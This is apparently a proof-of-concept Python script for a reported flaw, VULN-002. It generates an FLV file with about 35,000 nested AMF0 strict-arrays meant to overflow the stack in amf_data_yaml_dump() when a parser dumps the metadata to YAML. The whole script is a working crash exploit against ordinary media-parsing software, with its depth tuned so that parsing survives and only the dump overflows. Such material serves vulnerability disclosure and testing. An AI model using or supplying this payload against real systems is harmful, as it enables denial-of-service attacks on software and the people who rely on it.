#!/usr/bin/env python3
"""
PoC generator for VULN-002: Stack overflow via unbounded recursion in amf_data_yaml_dump().

Generates an FLV file with ~35000 levels of nested AMF0 strict-array (type 0x0A, count=1).
The read phase (~130B/frame * 35000 = ~4.5MB) fits within the 8MB stack.
The YAML dump phase (~300B/frame * 35000 = ~10.5MB) overflows the 8MB stack.
"""

import struct
import sys
import os

OUTPUT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002.flv")
DEPTH = 35000  # ~35000 levels of nested arrays

def build_amf_payload(depth):
    """Build deeply nested AMF0 strict-array payload."""
    # AMF0 string "onMetaData": type 0x02 + uint16_BE(len) + bytes
    key = b"\x02" + struct.pack(">H", len("onMetaData")) + b"onMetaData"

    # Build nested strict-arrays: type 0x0A + uint32_BE(1) per level
    # Each level wraps the next: count=1 means one element follows
    nested = b""
    for _ in range(depth):
        nested += b"\x0a" + struct.pack(">I", 1)

    # Leaf: AMF0 number (type 0x00) = 0.0 (8 bytes double)
    leaf = b"\x00" + b"\x00" * 8

    return key + nested + leaf


def build_flv(payload_bytes):
    """Wrap AMF payload in a valid FLV file."""
    # FLV header: signature + version + flags + header_size
    flv_header = b"FLV" + b"\x01" + b"\x05" + struct.pack(">I", 9)

    # First previous_tag_size = 0
    prev_tag_size_0 = struct.pack(">I", 0)

    # Script tag (type=0x12)
    tag_type = b"\x12"
    data_size = len(payload_bytes)
    data_size_bytes = struct.pack(">I", data_size)[1:]  # 3 bytes big-endian
    timestamp = b"\x00\x00\x00"
    timestamp_ext = b"\x00"
    stream_id = b"\x00\x00\x00"

    tag_header = tag_type + data_size_bytes + timestamp + timestamp_ext + stream_id
    tag = tag_header + payload_bytes

    # Previous tag size = header(11) + data_size
    prev_tag_size_1 = struct.pack(">I", 11 + data_size)

    return flv_header + prev_tag_size_0 + tag + prev_tag_size_1


def main():
    print(f"[*] Building AMF payload with {DEPTH} levels of nested strict-array...")
    payload = build_amf_payload(DEPTH)
    print(f"[*] AMF payload size: {len(payload)} bytes")

    flv_data = build_flv(payload)
    print(f"[*] Total FLV size: {len(flv_data)} bytes")

    with open(OUTPUT_FILE, "wb") as f:
        f.write(flv_data)
    print(f"[+] Written to: {OUTPUT_FILE}")


if __name__ == "__main__":
    main()
